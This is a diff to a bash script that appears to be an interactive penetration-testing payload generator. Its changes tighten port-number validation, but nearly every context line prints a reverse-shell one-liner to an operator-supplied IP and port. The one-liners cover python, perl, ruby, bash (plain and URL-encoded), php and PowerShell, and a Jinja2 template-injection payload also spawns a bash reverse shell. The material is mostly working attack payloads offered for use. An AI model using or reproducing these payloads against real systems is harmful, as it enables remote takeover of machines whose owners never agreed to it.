@@ -1542,7 +1542,7 @@ while true; do
 		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
-			if [[ "$MPORT" != "" ]];
+			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"""$MIP""\",""$MPORT""));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 			fi
@@ -1553,7 +1553,7 @@ while true; do
 		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
-			if [[ "$MPORT" != "" ]];
+			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "perl -e 'use Socket;$i=\"""$MIP""\";$p=""$MPORT"";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
 			fi
@@ -1564,7 +1564,7 @@ while true; do
 		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
-			if [[ "$MPORT" != "" ]];
+			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "ruby -rsocket -e'f=TCPSocket.open(\"""$MIP""\",""$MPORT"").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 			fi
@@ -1575,7 +1575,7 @@ while true; do
 		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
-			if [[ "$MPORT" != "" ]];
+			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "bash -i >& /dev/tcp/""$MIP""/""$MPORT"" 0>&1"
 				echo "bash+-c+'bash+-i+>%26+/dev/tcp/""$MIP""/""$MPORT""+0>%261'"
@@ -1587,7 +1587,7 @@ while true; do
 		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
-			if [[ "$MPORT" != "" ]];
+			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "php -r '\$sock=fsockopen(\""$MIP"\",""$MPORT"");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 			fi
@@ -2086,7 +2086,7 @@ while true; do
 		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
-			if [[ "$MPORT" != "" ]];
+			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "\$client = New-Object System.Net.Sockets.TCPClient(\"""$MIP""\",""$MPORT"");\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
 			fi
@@ -8823,7 +8823,7 @@ while true; do
 		then
 			echo "Digit your remote PORT"
 			read -p "(example, 9001): " MPRT
-			if [[ "$MPRT" != "" ]];
+			if [[ "$MPRT" =~ ^[0-9]+$ ]];
 			then
 				echo "{{config.__class__.__init__.__globals__['os'].popen(\"bash -c 'bash -i >& /dev/tcp/""$MIP""/""$MPRT"" 0>&1'\").read()}}"
 			fi
